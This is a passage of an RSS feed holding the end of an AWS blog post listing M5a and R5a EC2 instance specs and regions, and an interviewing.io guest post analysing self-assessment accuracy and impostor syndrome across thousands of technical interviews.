&lt;table cellpadding=&quot;8&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Instance Name&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;vCPUs&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;RAM&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;EBS-Optimized Bandwidth&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;Network Bandwidth&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.large&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;8 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;4&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;16 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.2xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;8&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;32 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.4xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;16&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;64 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.12xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;48&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;192 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;5 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;m5a.24xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;96&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;384 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;10 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;20 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;Memory Optimized Instances&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;Here are the specs for the R5a instances:&lt;/p&gt;
&lt;table cellpadding=&quot;8&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Instance Name&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;vCPUs&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;RAM&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;EBS-Optimized Bandwidth&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;Network Bandwidth&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.large&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;16 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;4&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;32 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.2xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;8&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;64 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.4xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;16&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;128 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;2.120 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Up to 10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.12xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;48&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;384 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;5 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;10 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;r5a.24xlarge&lt;br/&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;96&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;768 GiB&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;10 Gbps&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;20 Gbps&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;Available Now&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;These instances are available now and you can start using them today in the &lt;span title=&quot;&quot;&gt;US East (N. Virginia)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;US East (Ohio)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;US West (Oregon)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;Europe (Ireland)&lt;/span&gt;, and &lt;span title=&quot;&quot;&gt;Asia Pacific (Singapore)&lt;/span&gt; Regions in On-Demand, Spot, and Reserved Instance form. Pricing, as I noted earlier, is 10% lower than the equivalent existing instances. To learn more, visit our new &lt;a href=&quot;https://aws.amazon.com/ec2/amd/&quot;&gt;AMD Instances&lt;/a&gt; page.&lt;/p&gt;
&lt;p&gt;— &lt;a href=&quot;https://twitter.com/jeffbarr&quot;&gt;Jeff&lt;/a&gt;;&lt;/p&gt;
&lt;p&gt;PS – We are also working on T3a instances; stay tuned for more info!&lt;/p&gt;

</description>
<pubDate>Tue, 06 Nov 2018 17:09:44 +0000</pubDate>
<dc:creator>jeffbarr</dc:creator>
<og:title>New Lower-Cost, AMD-Powered M5a and R5a EC2 Instances | Amazon Web Services</og:title>
<og:type>article</og:type>
<og:url>https://aws.amazon.com/blogs/aws/new-lower-cost-amd-powered-ec2-instances/</og:url>
<og:description>From the start, AWS has focused on choice and economy. Driven by a never-ending torrent of customer requests that power our well-known Virtuous Cycle, I think we have delivered on both over the years: Choice – AWS gives you choices in a wide range of dimensions including locations (18 operational geographic regions, 4 more in […]</og:description>
<og:image>https://d2908q01vomqb2.cloudfront.net/da4b9237bacccdf19c0760cab7aec4a8359010b0/2018/11/02/m5a_r5a_featured_1.png</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://aws.amazon.com/blogs/aws/new-lower-cost-amd-powered-ec2-instances/</dc:identifier>
</item>
<item>
<title>Impostor syndrome strikes men just as hard as women in technical interviews</title>
<link>http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/</link>
<guid isPermaLink="true" >http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/</guid>
<description>&lt;p&gt;The modern technical interview is a rite of passage for software engineers and (hopefully!) the precursor to a great job. But it’s also a huge source of stress and endless questions for new candidates. Just searching “how do I prepare for a technical interview” turns up millions of Medium posts, coding bootcamp blogs, Quora discussions, and entire books.&lt;/p&gt;&lt;p&gt;Despite all this conversation, people struggle to know how they’re even doing in interviews. &lt;a href=&quot;http://blog.interviewing.io/people-are-still-bad-at-gauging-their-own-interview-performance-heres-the-data/&quot;&gt;In a previous post&lt;/a&gt;, we found that a surprisingly large number of interviewing.io’s users consistently underestimate their performance, making them more likely to drop out of the process and ultimately harder to hire. Now, and with considerably more data (over 10k interviews led by real software engineers!), we wanted to go deeper: &lt;strong&gt;what seems to make candidates worse at gauging their own performance?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We know some general facts that make accuracy a challenge: people aren’t always great at assessing or even remembering their performance on difficult cognitive tasks like writing code.&lt;sup&gt;&lt;a id=&quot;imposter-ref1&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; Technical interviews can be particularly hard to judge if candidates don’t have much experience with questions with no single right answer. Since many companies don’t share any kind of detailed post-interview feedback (beyond a yes/no) with candidates for liability reasons, many folks never get any sense of how they did, what they did well, or what could have been better.&lt;sup&gt;&lt;a id=&quot;imposter-ref2&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn2&quot;&gt;2&lt;/a&gt;, &lt;a id=&quot;imposter-ref3&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; Indeed, pulling back the curtain on interviewing, &lt;em&gt;across the industry,&lt;/em&gt; was one of the primary motivators for building interviewing.io!&lt;/p&gt;
&lt;p&gt;But to our knowledge there’s little data out there looking specifically at how people feel after real interviews on this scale, across different companies–so we gathered it, giving us the ability to test interesting industry assumptions about engineers and coding confidence.&lt;/p&gt;
&lt;p&gt;One big factor we were interested in was &lt;strong&gt;impostor syndrome&lt;/strong&gt;. Impostor syndrome resonates with a lot of engineers,&lt;sup&gt;&lt;a id=&quot;imposter-ref4&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn4&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; indicating that many wonder whether they truly match up to colleagues and discount even strong evidence of competence as a fluke. Impostor syndrome can make us wonder whether we can count on the positive performance feedback that we’re getting, and how much our opportunities have come from our own effort, versus luck. Of particular interest to us was whether this would show up for women on our platform. There’s a lot of research evidence that candidates from underrepresented backgrounds experience a greater lack of belonging that feeds impostor syndrome,&lt;sup&gt;&lt;a id=&quot;imposter-ref5&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn5&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; and this could show up as inaccuracy about judging your own interview performance.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;heading&quot;&gt;The setup&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;interviewing.io is a platform where people can practice technical interviewing anonymously, and if things go well, get jobs at top companies in the process. We started it because resumes uck and because we believe that anyone, regardless of how they look on paper, should have the opportunity to prove their mettle.&lt;/p&gt;
&lt;p&gt;When an interviewer and an interviewee match on interviewing.io, they meet in a collaborative coding environment with voice, text chat, and a whiteboard and jump right into a technical question (feel free to &lt;a href=&quot;https://interviewing.io/recordings/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;watch this process in action on our interview recordings page&lt;/a&gt;).  After each interview, people leave one another feedback, and each party can see what the other person said about them once they both submit their reviews.&lt;/p&gt;
&lt;p&gt;Here’s an example of an interviewer feedback form:&lt;/p&gt;
&lt;div id=&quot;attachment_118&quot; class=&quot;wp-caption aligncenter&quot; readability=&quot;32&quot;&gt;&lt;a href=&quot;http://blog.interviewing.io/wp-content/uploads/2015/12/interviewer-feedback.png&quot; rel=&quot;attachment wp-att-118&quot;&gt;&lt;img class=&quot;size-full wp-image-118&quot; src=&quot;http://blog.interviewing.io/wp-content/uploads/2016/09/new_interviewer_feedback_circled.png&quot; alt=&quot;Feedback form for interviewers&quot; width=&quot;450&quot;/&gt;&lt;/a&gt;
&lt;p class=&quot;wp-caption-text&quot;&gt;Feedback form for interviewers&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Immediately after the interview, candidates answered a question about how well they thought they’d done on the same 1-4 scale:&lt;/p&gt;
&lt;div id=&quot;attachment_122&quot; class=&quot;wp-caption aligncenter&quot; readability=&quot;32&quot;&gt;&lt;a href=&quot;http://blog.interviewing.io/wp-content/uploads/2015/12/interviewee-feedback.png&quot; rel=&quot;attachment wp-att-122&quot;&gt;&lt;img class=&quot;size-full wp-image-122&quot; src=&quot;http://blog.interviewing.io/wp-content/uploads/2016/09/new_interviewee_feedback_circled.png&quot; alt=&quot;Feedback form for interviewees&quot; width=&quot;450&quot;/&gt;&lt;/a&gt;
&lt;p class=&quot;wp-caption-text&quot;&gt;Feedback form for interviewees&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;For this post, we looked at over 10k technical interviews led by real software engineers from top companies. In each interview, a candidate was rated by an interviewer on their problem-solving ability, technical ability, and communication skills, as well as whether the interviewer would advance them to the next round. This gave us a measure of how different someone’s self-rating was from the rating that the interviewer actually gave them, and in which direction. In other words, how skewed was their estimation from their true performance?&lt;/p&gt;
&lt;p&gt;Going in, we had some hunches about what might matter:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Gender.&lt;/strong&gt; Would women be harder on their coding performance than men?&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Having been an interviewer before.&lt;/strong&gt; It seems reasonable that having been on the other side will pull back the curtain on interviews.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Being employed at a top company.&lt;/strong&gt; Similar to above.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Being a top-performing interviewee&lt;/strong&gt; on interviewing.io — people who are better interviewees overall might have more confidence and awareness of when they’ve gotten things right (or wrong!)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Being in the Bay Area&lt;/strong&gt; or not. Since tech is still so geographically centered on the Bay Area, we considered that folks who live in a more engineering-saturated culture could have greater familiarity with professional norms around interviews.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Within the interview itself, question quality and interviewer quality.&lt;/strong&gt; Presumably, a better interviewer is also a better communicator, whereas a confusing interviewer might throw off a candidates’ entire assessment of their performance. We also looked at whether it was a practice interview, or for a specific company role.&lt;/li&gt;
&lt;li&gt;For some candidates, we could also look at few measures of their &lt;strong&gt;personal brand&lt;/strong&gt; within the industry, like their number of GitHub and Twitter followers. Maybe people with a strong online presence are more sure of themselves when they interview?&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span class=&quot;heading&quot;&gt;So what did we find?&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;subheading&quot;&gt;Women are just as accurate as men at assessing their technical ability&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Contrary to expectations around gender and confidence, we &lt;em&gt;didn’t&lt;/em&gt; find a reliable statistically significant gender difference in accuracy. At first, it looked like female candidates were more likely to underestimate their performance, but when we controlled for other variables, like experience and rated technical ability, it turned out &lt;strong&gt;the key differentiator was experience.&lt;/strong&gt; More experienced engineers are more accurate about their interview performance, and men are more likely to be experienced engineers, but experienced female engineers are just as accurate about their technical ability.&lt;/p&gt;
&lt;p&gt;Based on previous research, we hypothesized that impostor syndrome and a greater lack of belonging could result in female candidates penalizing their interview performance, but we didn’t find that pattern.&lt;sup&gt;&lt;a id=&quot;imposter-ref6&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn6&quot;&gt;6&lt;/a&gt;&lt;/sup&gt; However, our finding echoes &lt;a href=&quot;https://gender.stanford.edu/sites/default/files/publications/climbing_the_technical_ladder.pdf&quot;&gt;a research project from the Stanford Clayman Institute for Gender Research&lt;/a&gt;, which looked at 1,795 mid-level tech workers from high tech companies. They found that women in tech aren’t necessarily less accurate when assessing their own abilities, but do have significantly different ideas about what success requires (e.g., long working hours and risk-taking). In other words, &lt;strong&gt;women in tech may not doubt their own abilities but might have different ideas about what’s expected&lt;/strong&gt;. &lt;a href=&quot;https://hbr.org/2014/08/why-women-dont-apply-for-jobs-unless-theyre-100-qualified&quot;&gt;And a survey from Harvard Business Review&lt;/a&gt;  asking over a thousand professionals about their job application decisions also made this point. Their results emphasized that gender gaps in evaluation scenarios could be more about &lt;strong&gt;different expectations for how scenarios like interviews are judged.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;That said, we did find one interesting difference: women went through fewer practice interviews overall than men did. The difference was small but statistically significant, and harkens back to &lt;a href=&quot;http://blog.interviewing.io/we-built-voice-modulation-to-mask-gender-in-technical-interviews-heres-what-happened/&quot;&gt;our earlier finding that women leave interviewing.io roughly 7 times as often as men do&lt;/a&gt;, after a bad interview.&lt;/p&gt;
&lt;p&gt;But in that same earlier post, we also found that masking voices didn’t impact interview outcomes. This whole cluster of findings affirms what we suspected and what the folks doing &lt;a href=&quot;https://gender.stanford.edu/sites/default/files/publications/climbing_the_technical_ladder.pdf&quot;&gt;in-depth studies of gender in tech&lt;/a&gt; have found: &lt;strong&gt;it’s complicated.&lt;/strong&gt; Women’s lack of persistence in interviews can’t be explained only by impostor syndrome about their &lt;em&gt;own&lt;/em&gt; abilities, but it’s still likely that they’re interpreting negative feedback more severely and making different assumptions about interviews.&lt;/p&gt;
&lt;p&gt;Here’s the distribution of accuracy distance for both female and male candidates on our platform (zero indicates a rating that matches the interviewer’s score, while negative values indicate underestimated score, and positive values indicate an overestimated score). The two groups look pretty much identical:&lt;/p&gt;
&lt;div class=&quot;plotly-container&quot;&gt;&lt;a href=&quot;https://plot.ly/~aline_interviewingio/1098/?share_key=gOxJw5UZnY81R2sSiTGPnf&amp;amp;autosize=true&amp;amp;link=false&amp;amp;modebar=false&quot; target=&quot;_blank&quot; title=&quot;Accuracy by gender&quot;&gt;&lt;img src=&quot;https://plot.ly/~aline_interviewingio/1098.png?share_key=gOxJw5UZnY81R2sSiTGPnf&amp;amp;autosize=true&amp;amp;link=false&amp;amp;modebar=false&quot; alt=&quot;Accuracy by gender&quot; width=&quot;600&quot; onerror=&quot;this.onerror=null;this.src='https://plot.ly/404.png';&quot;/&gt;&lt;/a&gt;&lt;br/&gt;&lt;/div&gt;
&lt;p&gt;&lt;span class=&quot;subheading&quot;&gt;What else didn’t matter?&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Another surprise: &lt;strong&gt;having been an interviewer didn’t help&lt;/strong&gt;. Even people who had been interviewers themselves don’t seem to get an accuracy boost from that. &lt;strong&gt;Personal brand was another non-finding&lt;/strong&gt;. &lt;strong&gt;People with more GitHub followers weren’t more accurate&lt;/strong&gt; than people with few to no GitHub followers. &lt;strong&gt;Nor did interviewer rating matter&lt;/strong&gt; (i.e. how well an interviewer was reviewed by their candidates), although to be fair, interviewers are generally rated quite highly on the site.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;subheading&quot;&gt;So what was a statistically significant boost to accurate judgments of interview performance? Mostly, experience.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Experienced engineers have a better sense for how well they did in interviews, compared with engineers earlier in their careers.&lt;sup&gt;&lt;a id=&quot;imposter-ref7&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn7&quot;&gt;7&lt;/a&gt;&lt;/sup&gt; But it doesn’t seem to &lt;em&gt;just&lt;/em&gt; be that you’re better at gauging your interview performance because you’re better at writing code; although there is a small lift from this, with higher rated engineers being more accurate. But when you look at junior engineers, &lt;strong&gt;even top-performing junior candidates struggled to accurately assess their performance&lt;/strong&gt;.&lt;sup&gt;&lt;a id=&quot;imposter-ref8&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn8&quot;&gt;8&lt;/a&gt;&lt;/sup&gt;  &lt;/p&gt;
&lt;div class=&quot;plotly-container&quot;&gt;&lt;a href=&quot;https://plot.ly/~aline_interviewingio/1105/?share_key=Jhb6Jva7ZCsGvGaepdpQns&amp;amp;autosize=true&amp;amp;link=false&amp;amp;modebar=false&quot; target=&quot;_blank&quot; title=&quot;experienced versus juniors&quot;&gt;&lt;img src=&quot;https://plot.ly/~aline_interviewingio/1105.png?share_key=Jhb6Jva7ZCsGvGaepdpQns&quot; alt=&quot;experienced versus juniors&quot; width=&quot;600&quot; onerror=&quot;this.onerror=null;this.src='https://plot.ly/404.png';&quot;/&gt;&lt;/a&gt;&lt;br/&gt;&lt;/div&gt;
&lt;p&gt;Our data mirrors a trend seen in &lt;a href=&quot;https://insights.stackoverflow.com/survey/2018#connection-and-competition&quot;&gt;Stack Overflow’s 2018 Developer survey&lt;/a&gt;. They asked respondents several questions about confidence and competition with other developers, and noted that more experienced engineers feel less competitive and more confident.&lt;sup&gt;&lt;a id=&quot;imposter-ref9&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn9&quot;&gt;9&lt;/a&gt;&lt;/sup&gt; This isn’t necessarily surprising: experience is correlated with skill level, after all, and highly skilled people are likely to be more confident. But our analysis let us control for performance and code skill within career groups, and we &lt;em&gt;still&lt;/em&gt; found that experienced engineers were better at predicting their interview scores. There are probably multiple factors here: experienced engineers have been through more interviews, have led interviews themselves, and have a stronger sense of belonging, all of which may combat impostor syndrome.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Insider knowledge and context also seems to help:&lt;/strong&gt; Being in the Bay Area and being at a top company both made people more accurate. Like the experienced career group, engineers who seem more likely to have &lt;em&gt;contextual industry knowledge&lt;/em&gt; are also more accurate. We found small but statistically significant lifts from factors like being located in the Bay Area and working at a top company. However, the lift from working at a top company seems to mostly measure a lift from overall technical ability: being at a top company is essentially a proxy measure for being a more experienced, higher quality engineer.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Finally, as you get better at interviewing and move into company interviews, you do get more accurate.&lt;/strong&gt; People were more accurate about their performance in company interviews compared to practice interviews, and their overall ranking on the interviewing.io site also predicted improved accuracy: interviewing.io also gives users an overall ranking, based on their performance over multiple interviews and weighted toward more recent measures. People who scored in the top 25% were more likely to be accurate about their interview performance.&lt;/p&gt;
&lt;p&gt;In general, how are people at gauging their interview performance overall? &lt;a href=&quot;http://blog.interviewing.io/people-are-still-bad-at-gauging-their-own-interview-performance-heres-the-data/&quot;&gt;We’ve looked at this before&lt;/a&gt;, with roughly a thousand interviews, and now, with ten thousand, the finding continues to hold up. Candidates were accurate about how they did in only 46% of interviews, and underestimated themselves in 35% of interviews (and the remaining 19%, of course, are the overestimators). Still, candidates are generally on the right track — it’s not like people who score a 4 are always giving themselves a 1.&lt;sup&gt;&lt;a id=&quot;imposter-ref10&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn10&quot;&gt;10&lt;/a&gt;&lt;/sup&gt; Self-ratings &lt;em&gt;are&lt;/em&gt; statistically significantly predictive for actual interview scores (and positively correlated), but that relationship is noisy.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;heading&quot;&gt;The implications&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Accurately judging your own interview performance is a skill in its own right and one that engineers need to learn from experience and context in the tech industry. But we’ve also learned that &lt;strong&gt;many of the assumptions we made about performance accuracy didn’t hold up to scrutiny —&lt;/strong&gt; female engineers had just as accurate a view of their own skills as male ones, and engineers who had led more interviews or were well known on GitHub weren’t particularly better at gauging their performance.&lt;/p&gt;
&lt;p&gt;What does this mean for the industry as a whole? First off, impostor syndrome appears to be the bleary-eyed monster that attacks across gender ability, and how good you are, or where you are, or how famous you are isn’t that important. Seniority does help mitigate some of the pain, but impostor syndrome affects everyone, regardless of who they are or where they’re from. So, maybe it’s time for a kinder, more empathetic interviewing culture. And a culture that’s kinder to everyone, because though marginalized groups who haven’t been socialized in technical interviewing are &lt;a href=&quot;http://blog.interviewing.io/you-cant-fix-diversity-in-tech-without-fixing-the-technical-interview/&quot;&gt;hit the hardest by shortcomings in the interview process&lt;/a&gt;, no one is immune to self-doubt.&lt;/p&gt;
&lt;p&gt;We’ve previously discussed what makes someone a good interviewer, and &lt;a href=&quot;http://blog.interviewing.io/what-do-the-best-interviewers-have-in-common-we-looked-at-thousands-of-real-interviews-to-find-out/&quot;&gt;empathy plays a disproportionately large role&lt;/a&gt;. And we’ve seen that &lt;a href=&quot;http://blog.interviewing.io/people-are-still-bad-at-gauging-their-own-interview-performance-heres-the-data/&quot;&gt;providing immediate post-interview feedback is really important for keeping candidates from dropping out&lt;/a&gt;. So, whether you’re motivated by kindness and ideology or cold, hard pragmatism, a bit more kindness and understanding toward your candidates is in order.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://www.drcathicks.com/&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Cat Hicks&lt;/a&gt;, the author of this guest post, is a researcher and data scientist with a focus on learning. She’s published empirical research on learning environments, and led research on the cognitive work of engineering teams at Google and Travr.se. She holds a PhD in Psychology from UC San Diego.&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;sharedaddy sd-sharing-enabled&quot;&gt;
&lt;div class=&quot;robots-nocontent sd-block sd-social sd-social-official sd-sharing&quot;&gt;
&lt;h3 class=&quot;sd-title&quot;&gt;Share this:&lt;/h3&gt;

&lt;/div&gt;
&lt;/div&gt;
</description>
<pubDate>Tue, 06 Nov 2018 16:52:05 +0000</pubDate>
<dc:creator>leeny</dc:creator>
<og:url>http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/</og:url>
<og:title>Impostor syndrome strikes men just as hard as women… and other findings from thousands of technical interviews</og:title>
<og:description></og:description>
<og:type>article</og:type>
<og:image></og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/</dc:identifier>
</item>
</channel>
</rss>